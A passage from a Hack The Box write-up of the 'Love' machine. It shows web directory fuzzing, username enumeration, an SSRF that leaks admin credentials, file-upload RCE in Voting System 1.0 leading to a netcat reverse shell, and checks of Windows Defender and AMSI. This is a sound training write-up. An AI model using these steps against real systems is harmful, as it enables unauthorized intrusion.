+</span><span class="z-text z-plain">http://love.htb/bower_components/bootstrap/dist/js/bootstrap.min.js
+</span><span class="z-text z-plain">http://love.htb/bower_components/font-awesome/css/font-awesome.min.css
+</span><span class="z-text z-plain">http://love.htb/dist/css/skins/_all-skins.min.css
+</span><span class="z-text z-plain">http://love.htb/dist/css/AdminLTE.min.css
+</span><span class="z-text z-plain">http://love.htb/bower_components/bootstrap/dist/css/bootstrap.min.css
+</span><span class="z-text z-plain">http://love.htb/bower_components/datatables.net/js/jquery.dataTables.min.js
+</span><span class="z-text z-plain">http://love.htb/bower_components/jquery/dist/jquery.min.js
+</span></code></pre>
+<p>The <code>dist/css/AdminLTE.min.css</code> has a promising name, but obviously it's only a CSS file.</p>
+<p>Still, if we get its content:</p>
+<pre data-lang="css" class="language-css z-code"><code class="language-css" data-lang="css"><span class="z-source z-css"><span class="z-comment z-block z-css"><span class="z-punctuation z-definition z-comment z-css">/*</span>!
+</span></span><span class="z-source z-css"><span class="z-comment z-block z-css"> <span class="z-punctuation z-definition z-comment z-css">*</span>  AdminLTE v2.4.0
+</span></span><span class="z-source z-css"><span class="z-comment z-block z-css"> <span class="z-punctuation z-definition z-comment z-css">*</span>  Author: Almsaeed Studio
+</span></span><span class="z-source z-css"><span class="z-comment z-block z-css"> <span class="z-punctuation z-definition z-comment z-css">*</span>  Website: Almsaeed Studio &lt;https://adminlte.io&gt;
+</span></span><span class="z-source z-css"><span class="z-comment z-block z-css"> <span class="z-punctuation z-definition z-comment z-css">*</span>  License: Open source - MIT
+</span></span><span class="z-source z-css"><span class="z-comment z-block z-css"> <span class="z-punctuation z-definition z-comment z-css">*</span>  Please visit http://opensource.org/licenses/MIT for more information
+</span></span><span class="z-source z-css"><span class="z-comment z-block z-css"> <span class="z-punctuation z-definition z-comment z-css">*/</span></span>
+</span><span class="z-source z-css">&lt;<span class="z-meta z-selector z-css">SNIP<span class="z-punctuation z-separator z-combinator z-css">&gt;</span>
+</span></span></code></pre>
+<p>If we search online, we find that <code>AdminLTE</code> is a Bootstrap dashboard template. This means that there must be a dashboard for admins!</p>
+<h3 id="directory-fuzzing">Directory fuzzing</h3>
+<p>Let's see if we can find unliked web pages and directories.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> http://love.htb/FUZZ<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> .php</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[Status: 200, Size: 4388, Words: 654, Lines: 126, Duration: 36ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/index.php
+</span><span class="z-text z-plain">    * FUZZ: index.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 330, Words: 22, Lines: 10, Duration: 42ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/images
+</span><span class="z-text z-plain">| --&gt; | http://love.htb/images/
+</span><span class="z-text z-plain">    * FUZZ: images
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 45ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/home.php
+</span><span class="z-text z-plain">| --&gt; | index.php
+</span><span class="z-text z-plain">    * FUZZ: home.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 26ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/login.php
+</span><span class="z-text z-plain">| --&gt; | index.php
+</span><span class="z-text z-plain">    * FUZZ: login.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 330, Words: 22, Lines: 10, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/Images
+</span><span class="z-text z-plain">| --&gt; | http://love.htb/Images/
+</span><span class="z-text z-plain">    * FUZZ: Images
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 329, Words: 22, Lines: 10, Duration: 35ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/admin
+</span><span class="z-text z-plain">| --&gt; | http://love.htb/admin/
+</span><span class="z-text z-plain">    * FUZZ: admin
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/Home.php
+</span><span class="z-text z-plain">| --&gt; | index.php
+</span><span class="z-text z-plain">    * FUZZ: Home.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 331, Words: 22, Lines: 10, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/plugins
+</span><span class="z-text z-plain">| --&gt; | http://love.htb/plugins/
+</span><span class="z-text z-plain">    * FUZZ: plugins
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 332, Words: 22, Lines: 10, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/includes
+</span><span class="z-text z-plain">| --&gt; | http://love.htb/includes/
+</span><span class="z-text z-plain">    * FUZZ: includes
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 4388, Words: 654, Lines: 126, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/Index.php
+</span><span class="z-text z-plain">    * FUZZ: Index.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/Login.php
+</span><span class="z-text z-plain">| --&gt; | index.php
+</span><span class="z-text z-plain">    * FUZZ: Login.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/logout.php
+</span><span class="z-text z-plain">| --&gt; | index.php
+</span><span class="z-text z-plain">    * FUZZ: logout.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/preview.php
+</span><span class="z-text z-plain">| --&gt; | index.php
+</span><span class="z-text z-plain">    * FUZZ: preview.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 328, Words: 22, Lines: 10, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/dist
+</span><span class="z-text z-plain">| --&gt; | http://love.htb/dist/
+</span><span class="z-text z-plain">    * FUZZ: dist
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 417, Words: 37, Lines: 12, Duration: 104ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/licenses
+</span><span class="z-text z-plain">    * FUZZ: licenses
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 330, Words: 22, Lines: 10, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/IMAGES
+</span><span class="z-text z-plain">| --&gt; | http://love.htb/IMAGES/
+</span><span class="z-text z-plain">    * FUZZ: IMAGES
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/%20
+</span><span class="z-text z-plain">    * FUZZ: %20
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 4388, Words: 654, Lines: 126, Duration: 88ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/INDEX.php
+</span><span class="z-text z-plain">    * FUZZ: INDEX.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 329, Words: 22, Lines: 10, Duration: 40ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/Admin
+</span><span class="z-text z-plain">| --&gt; | http://love.htb/Admin/
+</span><span class="z-text z-plain">    * FUZZ: Admin
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/*checkout*
+</span><span class="z-text z-plain">    * FUZZ: *checkout*
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 29ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/*checkout*.php
+</span><span class="z-text z-plain">    * FUZZ: *checkout*.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 331, Words: 22, Lines: 10, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/Plugins
+</span><span class="z-text z-plain">| --&gt; | http://love.htb/Plugins/
+</span><span class="z-text z-plain">    * FUZZ: Plugins
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/phpmyadmin
+</span><span class="z-text z-plain">    * FUZZ: phpmyadmin
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 71ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/HOME.php
+</span><span class="z-text z-plain">| --&gt; | index.php
+</span><span class="z-text z-plain">    * FUZZ: HOME.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/webalizer
+</span><span class="z-text z-plain">    * FUZZ: webalizer
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/Logout.php
+</span><span class="z-text z-plain">| --&gt; | index.php
+</span><span class="z-text z-plain">    * FUZZ: Logout.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/*docroot*
+</span><span class="z-text z-plain">    * FUZZ: *docroot*
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/*docroot*.php
+</span><span class="z-text z-plain">    * FUZZ: *docroot*.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/*.php
+</span><span class="z-text z-plain">    * FUZZ: *.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/*
+</span><span class="z-text z-plain">    * FUZZ: *
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/Preview.php
+</span><span class="z-text z-plain">| --&gt; | index.php
+</span><span class="z-text z-plain">    * FUZZ: Preview.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 27ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/con.php
+</span><span class="z-text z-plain">    * FUZZ: con.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 27ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/con
+</span><span class="z-text z-plain">    * FUZZ: con
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/http%3A.php
+</span><span class="z-text z-plain">    * FUZZ: http%3A.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/http%3A
+</span><span class="z-text z-plain">    * FUZZ: http%3A
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 332, Words: 22, Lines: 10, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://love.htb/Includes
+</span><span class="z-text z-plain">| --&gt; | http://love.htb/Includes/
+</span><span class="z-text z-plain">    * FUZZ: Includes
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>There's many, many hits. But the most interesting has to be <code>/admin</code>.</p>
+<p>Let's browse to <code>http://love.htb/admin</code> and see what we get.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/domain-admin-page.png" alt="Domain '/admin' page" /></p>
+<p>The same form! But this time, if we fill it with <code>foo</code> as the username, the error message is different:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/domain-admin-page-username-error.png" alt="Domain '/admin' page username error" /></p>
+<p>And if we try <code>admin</code>:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/domain-admin-page-password-error.png" alt="Domain '/admin' page password error" /></p>
+<p>Now we have a way to enumerate usernames!</p>
+<h3 id="known-cves-1">Known CVEs</h3>
+<p>We found the 'Voting System' form twice already. Maybe it's not a fully custom PHP web application, but a common one?</p>
+<p>If we search online for this name, we stumble across <a href="https://www.sourcecodester.com/php/12306/voting-system-using-php.html">this webpage</a>. It mentions that this is a web application that uses PHP and MySQL, and the <code>AdminLTE</code> plugin.</p>
+<p>These technologies fit this website!</p>
+<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>Voting System</code>, we find many entries. Unfortunately, none of the ones I tried worked.</p>
+<h3 id="staging-love-htb-subdomain"><code>staging.love.htb</code> subdomain</h3>
+<p>Let's not lose too much time on the <code>love.htb</code> domain, since we found in the <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#scripts">Scripts</a> section a subdomain.</p>
+<p>Let's browse to <code>http://staging.love.htb/</code> and see which web page is served.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/subdomain-homepage.png" alt="Subdomain homepage" /></p>
+<p>So it's a website to scan files for known malware signatures.</p>
+<h3 id="under-the-hood-1">Under the hood</h3>
+<p>If we fill the sign up form and press enter, we are just redirected to the same webpage. In fact, it just sends a GET request to <code>/?</code>, so this functionality doesn't really exist.</p>
+<h3 id="exploration">Exploration</h3>
+<p>If we browse the website, we see that we have access to web page located at <code>/beta.php</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/subdomain-demo-page.png" alt="Subdomain 'Demo' page" /></p>
+<p>We can enter a URL corresponding to the file we want to scan.</p>
+<p>If we enter an empty URL, we receive an alert 'Please enter a file url to scan'. If we enter <code>foo</code>, the web page just reloads.</p>
+<h3 id="under-the-hood-2">Under the hood</h3>
+<p>Upon pressing the 'Scan file' button, a POST request is sent to <code>/beta.php</code> with content:</p>
+<pre data-lang="html" class="language-html z-code"><code class="language-html" data-lang="html"><span class="z-text z-html z-basic">file=foo&amp;read=Scan+file
+</span></code></pre>
+<p>The response contains a <code>200</code> code, and returns the same <code>beta.php</code> web page.</p>
+<p>However, unlike the sign up form, this one actually sends data... there must be some PHP code to perform checks on the URL file we entered. But to perform these checks, it needs to fetch that file!</p>
+<p>I'll specify a URL refering to a non-existent file on the HTTP server I set up in the <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#setup">Setup</a> section. I'll enter <code>http://10.10.14.12:8000/nonExistent</code> as the file URL, and I'll press on the 'Scan file' button.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/subdomain-demo-page-fake-url-entered.png" alt="Subdomain 'Demo' page when fake url is entered" /></p>
+<p>This time there's a '404 page not found' error message under the form. But wait... if it didn't find this file, it means that it must have tried! Let's check our HTTP server:</p>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[2023-12-20 09:09:24] 10.10.10.239:62305 &quot;GET /nonExistent HTTP/1.1&quot; 404 19
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It did!</p>
+<p>Now let's try to retrieve a file that does exist.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/subdomain-demo-page-valid-url-entered.png" alt="Subdomain 'Demo' page when valid url is entered" /></p>
+<p>It includes the content of the retrieved file in the response!</p>
+<h3 id="ssrf">SSRF</h3>
+<p>Now we know that the PHP code fetches the file from the URL we enter and shows it back. Maybe we can use this to retrieve the content of web pages we don't have access to?</p>
+<p>We can try to access the web severs we found in the <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#tcp-port-scanning">TCP port scanning</a> section.</p>
+<p>If we enter <code>https://127.0.0.1:443/</code> as the file URL, it returns nothing. But if we enter <code>http://127.0.0.1:5000/</code>...</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/get-apache-server-port-5000-content-with-ssrf.png" alt="Retrieving the content of Apache server on port '5000/tcp' with SSRF" /></p>
+<p>We should be able to use the credentials <code>admin</code>:<code>@LoveIsInTheAir!!!!</code> to access the dashboard for the voting system on the <code>love.htb</code> domain!</p>
+<h3 id="voting-system-dashboard">Voting system dashboard</h3>
+<p>Let's browse to <code>http://love.htb/admin</code> and enter the credentials we just found.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/subdomain-dashboard-page.png" alt="Subdomain dashboard page" /></p>
+<p>Okay, we have access to a dashboard now.</p>
+<p>We can manage the voters, positions and candidates, but they're all empty. We can also see the votes, but there's none.</p>
+<h1 id="foothold-file-upload">Foothold (File upload)</h1>
+<p>Back to the <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#known-cves">Known CVEs</a> section, one of the <a href="https://www.exploit-db.com/">ExploitDB</a> entries was <a href="https://www.exploit-db.com/exploits/49445">Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)</a>. Since we're authenticated now, it might be worth trying it!</p>
+<p>When adding voters, we can specify various fields like 'First name', 'Last name' or 'Password', but also 'Photo'. The vulnerability lies in this <code>photo</code> field: the image we enter is not validated, which means that we can create any type of file, including PHP files, and execute them on the server side. This effectively leads to RCE.</p>
+<p>This vulnerability is easy to exploit by hand, so I won't use the provided Python script.</p>
+<h2 id="preparation">Preparation</h2>
+<p>Let's use this vulnerability to obtain a reverse shell. I'll use <a href="https://www.revshells.com/">this website</a> to find appropriate payloads.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> 9001</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">listening on [any] 9001 ...
+</span></code></pre>
+<p>Now, let's create the PHP file to get the reverse shell. I'm going to use the 'PHP Ivan Sincek' one from the last website, configured to use a <code>powershell</code> shell. The payload is more than 100 lines long, so I won't include it here.</p>
+<p>Let's save it as <code>/workspace/revshell.php</code>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Now, let's create a new voter with random fields. The only one that matters is 'Photo', we have to set it to our PHP file.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/voting-system-add-fake-voter-malicious-php-photo.png" alt="Adding a fake voter to the 'Voting System' with malicious PHP photo to get a reverse shell" /></p>
+<p>Then, the webpage should automatically reload, and if we look at our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.12] from (UNKNOWN) [10.10.10.239] 62381
+</span><span class="z-text z-plain">SOCKET: Shell has connected! PID: 2408
+</span><span class="z-text z-plain">Microsoft Windows [Version 10.0.19042.867]
+</span><span class="z-text z-plain">(c) 2020 Microsoft Corporation. All rights reserved.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">C:\xampp\htdocs\omrs\images&gt;
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<p>It's a standard one though, so I'll transform it into a Powershell session.</p>
+<h1 id="local-enumeration">Local enumeration</h1>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>phoebe</code>.</p>
+<h2 id="version">Version</h2>
+<p>Let's gather some information about the Windows version of Love.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>v ProductName
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+</span><span class="z-text z-plain">    ProductName    REG_SZ    Windows 10 Pro
+</span></code></pre>
+<p>Okay, so this confirms that Love is using Windows 10 Pro.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>v CurrentBuildNumber
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+</span><span class="z-text z-plain">    CurrentBuildNumber    REG_SZ    19042
+</span></code></pre>
+<p>And this is build <code>19042</code>.</p>
+<p>This version of Windows is somewhat recent, but maybe there are missing hotfixes. We'll check that later, if we can't find another way to get <code>NT AUTHORITY\SYSTEM</code>.</p>
+<h2 id="architecture">Architecture</h2>
+<p>What is Love's architecture?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>v PROCESSOR_ARCHITECTURE
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
+</span><span class="z-text z-plain">    PROCESSOR_ARCHITECTURE    REG_SZ    AMD64
+</span></code></pre>
+<p>So this system is using x64. This will be useful to know if we want to compile our own exploits.</p>
+<h2 id="windows-defender">Windows Defender</h2>
+<p>Let's check if Windows Defender is enabled.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>v ProductStatus
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender
+</span><span class="z-text z-plain">    ProductStatus    REG_DWORD    0x0
+</span></code></pre>
+<p>It's disabled! That's great, it will make our life easier.</p>
+<h2 id="amsi">AMSI</h2>
+<p>Let's check if there's any AMSI provider.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<p>There's no output, so no AMSI provider here!</p>
+<h2 id="firewall">Firewall</h2>
+<p>Let's see which Windows Firewall policies profiles are enabled.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>s <span class="z-keyword z-operator z-assignment z-powershell">/</span>v EnableFirewall
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile
+</span><span class="z-text z-plain">    EnableFirewall    REG_DWORD    0x1
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile
+</span><span class="z-text z-plain">    EnableFirewall    REG_DWORD    0x0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile
+</span><span class="z-text z-plain">    EnableFirewall    REG_DWORD    0x0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">End of search: 3 match(es) found.
+</span></code></pre>
+<p>Okay, so only the Firewall domain profile is enabled. It shouldn't hinder our progression too much though: since we alreay managed to obtain a reverse shell, the protections should be really basic.</p>
+<h2 id="nics">NICs</h2>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> ipconfig <span class="z-keyword z-operator z-assignment z-powershell">/</span>all
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Windows IP Configuration
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Host Name . . . . . . . . . . . . : Love
+</span><span class="z-text z-plain">   Primary Dns Suffix  . . . . . . . : 
+</span><span class="z-text z-plain">   Node Type . . . . . . . . . . . . : Hybrid
+</span><span class="z-text z-plain">   IP Routing Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">   WINS Proxy Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Ethernet adapter Ethernet0 2:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : 
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-50-56-B9-BC-9A
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span><span class="z-text z-plain">   IPv4 Address. . . . . . . . . . . : 10.10.10.239(Preferred) 
+</span><span class="z-text z-plain">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+</span><span class="z-text z-plain">   Default Gateway . . . . . . . . . : 10.10.10.2
+</span><span class="z-text z-plain">   DNS Servers . . . . . . . . . . . : 8.8.8.8
+</span><span class="z-text z-plain">   NetBIOS over Tcpip. . . . . . . . : Enabled
+</span></code></pre>
+<p>Looks like there's a single network.</p>
+<h2 id="local-users">Local users</h2>
+<p>Let's enumerate all local users using <code>PowerView</code>.</p>
